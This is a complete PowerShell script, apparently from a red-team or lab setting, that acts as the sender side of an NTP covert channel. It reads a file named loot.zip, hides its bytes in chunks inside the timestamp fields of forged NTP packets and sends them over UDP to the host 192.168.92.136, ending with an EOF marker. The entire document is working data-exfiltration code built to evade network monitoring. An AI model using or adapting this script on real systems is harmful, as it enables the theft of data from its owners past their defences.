# NTP Covert Channel - Sender
# Encodes loot.zip into NTP packet timestamp fields
$file = [System.IO.File]::ReadAllBytes("C:\temp\loot.zip")
$client = New-Object System.Net.Sockets.UdpClient
$client.Connect("192.168.92.136", 123)

for ($i = 0; $i -lt $file.Length; $i += 32) {
    $ntp = New-Object byte[] 48
    $ntp[0] = 0x1B
    $ntp[1] = 0x01
    $ntp[2] = 0x06
    $ntp[3] = 0xEC
    $chunk = $file[$i..[Math]::Min($i+31, $file.Length-1)]
    [Array]::Copy($chunk, 0, $ntp, 16, $chunk.Length)
    $client.Send($ntp, 48) | Out-Null
    Start-Sleep -Milliseconds 10
}

$eof = New-Object byte[] 48
$eof[0] = 0x1B
[Array]::Copy([System.Text.Encoding]::ASCII.GetBytes("EOF"), 0, $eof, 16, 3)
$client.Send($eof, 48) | Out-Null
$client.Close()
